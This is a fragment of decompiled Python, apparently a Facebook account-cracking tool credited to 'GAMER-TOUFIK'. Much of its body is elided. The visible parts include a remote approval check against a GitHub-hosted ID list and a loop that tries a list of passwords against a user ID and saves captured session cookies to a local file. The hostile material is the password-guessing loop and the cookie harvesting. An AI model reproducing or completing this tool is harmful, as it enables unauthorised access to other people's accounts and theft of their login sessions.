# Decompile by Mardis (Tools By GAMER-TOUFIK)
...
└━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
      ┌━━━━━━━━━━━━━━━━━ N3OB ━━━━━━━━━━━━━━━━━━┑
               ...
               \033[1;91mFACEBOK      :  C T  TOUFIK              
               \033[1;97mGITHUB       :  TOUF1K-H4CKER       
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/testourx/T-X/main/Approvalb2.txt').text
    if id in httpCaht:
...
def c(uid,pwx,ln):
    ...
    try:
        for ps in pwx:
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	open('TOUFIK-coki.txt', 'a').write(coki+'\n')
        ...
        #sys.stdout.write('\r%s   [TOUFIK] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
       # sys.stdout.flush()
